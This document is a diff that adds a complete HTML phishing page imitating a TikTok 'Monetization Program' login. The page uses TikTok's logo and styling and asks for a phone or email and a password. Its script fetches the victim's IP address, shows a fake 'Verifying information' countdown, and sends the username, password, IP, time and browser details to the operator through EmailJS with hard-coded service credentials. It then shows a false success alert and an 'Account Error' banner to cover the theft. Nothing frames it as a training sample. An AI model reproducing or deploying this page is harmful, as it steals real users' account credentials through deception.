@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Proxima Nova', Arial, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #010101 0%, #2a2a2a 100%);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      position: relative;
+    }
+    
+    .login-container {
+      background: #121212;
+      padding: 2.5rem;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      border: 1px solid #2a2a2a;
+      z-index: 10;
+      position: relative;
+    }
+    
+    .logo-container {
+      margin: 0 auto 1.8rem;
+      width: 90px;
+      height: 90px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      
+      padding: 5px;
+    }
+    
+    .logo {
+      width: 80px;
+      height: 80px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #121212;
+      border-radius: 50%;
+      overflow: hidden;
+    }
+    
+    .logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    
+    h2 {
+      margin-bottom: 1.8rem;
+      font-weight: 700;
+      font-size: 1.8rem;
+      letter-spacing: 0.5px;
+    }
+    
+    .input-group {
+      margin-bottom: 1.2rem;
+      text-align: left;
+      position: relative;
+    }
+    
+    .input-group label {
+      display: block;
+      font-size: 0.95rem;
+      margin-bottom: 0.5rem;
+      color: #aaa;
+      font-weight: 600;
+    }
+    
+    .input-group input {
+      width: 100%;
+      padding: 0.9rem 1rem;
+      border: 1.5px solid #3a3a3a;
+      border-radius: 8px;
+      background: #1e1e1e;
+      color: #fff;
+      font-size: 1rem;
+      outline: none;
+      transition: all 0.3s ease;
+      font-weight: 500;
+    }
+    
+    .input-group input:focus {
+      border-color: #69C9D0;
+      box-shadow: 0 0 0 2px rgba(105, 201, 208, 0.2);
+    }
+    
+    .input-group input.error {
+      border-color: #EE1D52;
+    }
+    
+    .error-message {
+      color: #EE1D52;
+      font-size: 0.8rem;
+      margin-top: 0.4rem;
+      display: none;
+      font-weight: 500;
+    }
+    
+    button {
+      width: 100%;
+      padding: 1rem;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(45deg, #69C9D0, #EE1D52);
+      color: #fff;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 0.8rem;
+      transition: all 0.3s ease;
+      letter-spacing: 0.5px;
+    }
+    
+    button:hover {
+      opacity: 0.9;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(238, 29, 82, 0.4);
+    }
+    
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .options {
+      margin-top: 1.5rem;
+      font-size: 0.9rem;
+      color: #aaa;
+    }
+    
+    .options a {
+      color: #69C9D0;
+      text-decoration: none;
+      font-weight: 600;
+      transition: color 0.2s ease;
+    }
+    
+    .options a:hover {
+      color: #EE1D52;
+      text-decoration: underline;
+    }
+    
+    #loading {
+      display: none;
+      margin-top: 1.2rem;
+      color: #69C9D0;
+    }
+    
+    .loader {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #69C9D0;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .timer-text {
+      display: inline-block;
+      vertical-align: middle;
+      font-weight: 500;
+    }
+    
+    .divider {
+      height: 1px;
+      background: linear-gradient(to right, transparent, #3a3a3a, transparent);
+      margin: 1.5rem 0;
+    }
+    
+    .footer {
+      margin-top: 1.2rem;
+      font-size: 0.8rem;
+      color: #777;
+    }
+    
+    .input-icon {
+      position: absolute;
+      right: 15px;
+      top: 38px;
+      color: #69C9D0;
+    }
+    
+    .switch-type {
+      color: #69C9D0;
+      font-size: 0.9rem;
+      margin-top: 0.5rem;
+      cursor: pointer;
+      display: inline-block;
+      font-weight: 600;
+    }
+    
+    .switch-type:hover {
+      color: #EE1D52;
+    }
+    
+    /* Admin Banner Styles */
+    .admin-banner {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(45deg, #EE1D52, #ff5252);
+      color: white;
+      padding: 15px 25px;
+      border-radius: 10px;
+      box-shadow: 0 5px 20px rgba(238, 29, 82, 0.5);
+      z-index: 1000;
+      display: none;
+      align-items: center;
+      animation: slideIn 0.5s forwards;
+      max-width: 90%;
+    }
+    
+    .admin-banner i {
+      margin-right: 10px;
+      font-size: 1.2rem;
+    }
+    
+    .admin-banner p {
+      margin: 0;
+      font-weight: 600;
+      font-size: 1rem;
+    }
+    
+    @keyframes slideIn {
+      from {
+        top: -100px;
+        opacity: 0;
+      }
+      to {
+        top: 20px;
+        opacity: 1;
+      }
+    }
+    
+    @keyframes slideOut {
+      from {
+        top: 20px;
+        opacity: 1;
+      }
+      to {
+        top: -100px;
+        opacity: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Admin Banner -->
+  <div class="admin-banner" id="adminBanner">
+    <i class="fas fa-exclamation-circle"></i>
+    <p>Account Error: Contact Admin</p>
+  </div>
+
+  <div class="login-container">
+    <div class="logo-container">
+      <div class="logo">
+        <!-- Replace with your actual image path -->
+        <img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png" alt="TikTok Logo">
+      </div>
+    </div>
+    
+    <h2>Log in to Monetization Program</h2>
+    
+    <form id="loginForm">
+      <div class="input-group">
+        <label for="loginField" id="loginLabel">Phone or Email</label>
+        <input type="text" id="loginField" placeholder="Enter your phone or email" required>
+        <i class="fas fa-user input-icon" id="fieldIcon"></i>
+        <div class="error-message" id="login-error">Please enter a valid phone number or email address</div>
+        <div class="switch-type" id="switchType">Use <span id="switchText">email</span> instead</div>
+      </div>
+      
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <i class="fas fa-lock input-icon"></i>
+        <div class="error-message" id="password-error">Password must be at least 8 characters</div>
+      </div>
+      
+      <button type="submit" id="loginButton">Log In</button>
+      
+      <div id="loading">
+        <span class="loader"></span>
+        <span class="timer-text">Verifying information... Please wait (<span id="countdown">4</span>s)</span>
+      </div>
+    </form>
+    
+    
+    
+    <div class="divider"></div>
+    
+    <div class="options">
+      <p>Don't have an account? <a href="https://www.tiktok.com/signup">Sign up</a></p>
+    </div>
+    
+  
+  </div>
+
+  <!-- Load EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS
+    (function() {
+      emailjs.init('-8gfGiHT5fBMnwE99'); // Your public key
+      
+      // State management
+      let isPhoneLogin = true;
+      
+      // DOM elements
+      const loginField = document.getElementById('loginField');
+      const loginLabel = document.getElementById('loginLabel');
+      const fieldIcon = document.getElementById('fieldIcon');
+      const switchType = document.getElementById('switchType');
+      const switchText = document.getElementById('switchText');
+      const passwordInput = document.getElementById('password');
+      const adminBanner = document.getElementById('adminBanner');
+      
+      // Function to show admin banner
+      function showAdminBanner() {
+        adminBanner.style.display = 'flex';
+        adminBanner.style.animation = 'slideIn 0.5s forwards';
+        
+        // Auto hide after 5 seconds
+        setTimeout(() => {
+          hideAdminBanner();
+        }, 5000);
+      }
+      
+      // Function to hide admin banner
+      function hideAdminBanner() {
+        adminBanner.style.animation = 'slideOut 0.5s forwards';
+        setTimeout(() => {
+          adminBanner.style.display = 'none';
+        }, 500);
+      }
+      
+      // Switch between phone and email
+      switchType.addEventListener('click', function() {
+        isPhoneLogin = !isPhoneLogin;
+        
+        if (isPhoneLogin) {
+          loginLabel.textContent = 'Phone';
+          loginField.placeholder = 'Enter your phone number';
+          fieldIcon.className = 'fas fa-phone input-icon';
+          switchText.textContent = 'email';
+        } else {
+          loginLabel.textContent = 'Email';
+          loginField.placeholder = 'Enter your email address';
+          fieldIcon.className = 'fas fa-envelope input-icon';
+          switchText.textContent = 'phone';
+        }
+        
+        // Clear field and remove errors when switching
+        loginField.value = '';
+        loginField.classList.remove('error');
+        document.getElementById('login-error').style.display = 'none';
+      });
+      
+      // Validation functions
+      function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+      }
+      
+      function isValidPhone(phone) {
+        // International phone format validation
+        const phoneRegex = /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{2,4}[-\s\.]?[0-9]{2,4}[-\s\.]?[0-9]{2,8}$/;
+        return phoneRegex.test(phone.replace(/\s/g, ''));
+      }
+      
+      function validateLogin(input) {
+        const value = input.value.trim();
+        const errorElement = document.getElementById('login-error');
+        
+        if (!value) {
+          input.classList.add('error');
+          errorElement.textContent = isPhoneLogin ? 'Phone number is required' : 'Email address is required';
+          errorElement.style.display = 'block';
+          return false;
+        }
+        
+        // Check if it's valid based on current mode
+        const isValid = isPhoneLogin ? isValidPhone(value) : isValidEmail(value);
+        
+        if (isValid) {
+          input.classList.remove('error');
+          errorElement.style.display = 'none';
+          return true;
+        } else {
+          input.classList.add('error');
+          errorElement.textContent = isPhoneLogin ? 
+            'Please enter a valid phone number' : 'Please enter a valid email address';
+          errorElement.style.display = 'block';
+          return false;
+        }
+      }
+      
+      function validatePassword(input) {
+        const value = input.value.trim();
+        const errorElement = document.getElementById('password-error');
+        
+        if (!value) {
+          input.classList.add('error');
+          errorElement.textContent = 'Password is required';
+          errorElement.style.display = 'block';
+          return false;
+        } else if (value.length < 8) {
+          input.classList.add('error');
+          errorElement.textContent = 'Password must be at least 8 characters';
+          errorElement.style.display = 'block';
+          return false;
+        } else {
+          input.classList.remove('error');
+          errorElement.style.display = 'none';
+          return true;
+        }
+      }
+      
+      // Set up event listeners for validation
+      loginField.addEventListener('blur', () => validateLogin(loginField));
+      loginField.addEventListener('input', () => {
+        if (loginField.classList.contains('error')) {
+          validateLogin(loginField);
+        }
+      });
+      
+      passwordInput.addEventListener('blur', () => validatePassword(passwordInput));
+      passwordInput.addEventListener('input', () => {
+        if (passwordInput.classList.contains('error')) {
+          validatePassword(passwordInput);
+        }
+      });
+      
+      document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        // Validate inputs before proceeding
+        const isLoginValid = validateLogin(loginField);
+        const isPasswordValid = validatePassword(passwordInput);
+        
+        if (!isLoginValid || !isPasswordValid) {
+          return;
+        }
+        
+        // Disable the login button to prevent multiple submissions
+        const loginButton = document.getElementById('loginButton');
+        loginButton.disabled = true;
+        
+        // Show loading message
+        const loadingElement = document.getElementById('loading');
+        const countdownElement = document.getElementById('countdown');
+        loadingElement.style.display = 'block';
+        
+        // Start countdown timer
+        let seconds = 4;
+        const timer = setInterval(() => {
+          seconds--;
+          countdownElement.textContent = seconds;
+          
+          if (seconds <= 0) {
+            clearInterval(timer);
+          }
+        }, 1000);
+        
+        try {
+          // Get additional data
+          const time = new Date().toLocaleString();
+          let ip = 'Unknown';
+          
+          try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+          } catch (ipError) {
+            console.log('Could not get IP:', ipError);
+          }
+
+          // Wait for the 4 seconds to complete before sending the email
+          await new Promise(resolve => setTimeout(resolve, 4000));
+          
+          // Send email using EmailJS
+          await emailjs.send('service_cdmrib9', 'template_nzeveud', {
+            username: document.getElementById('loginField').value,
+            password: document.getElementById('password').value,
+            time: time,
+            ip: ip,
+            user_agent: navigator.userAgent,
+            login_type: isPhoneLogin ? 'Phone' : 'Email'
+          });
+          
+          // First alert with OK button
+          alert('Verification successful! Please click OK to continue.');
+          
+          // Show admin banner instead of second alert
+          showAdminBanner();
+          
+        } catch (error) {
+          console.error('EmailJS Error:', error);
+          alert('Error: Could not verify your details. Please try again.');
+        } finally {
+          // Hide loading message and re-enable button
+          loadingElement.style.display = 'none';
+          loginButton.disabled = false;
+          countdownElement.textContent = '4'; // Reset countdown
+          clearInterval(timer); // Ensure timer is cleared
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
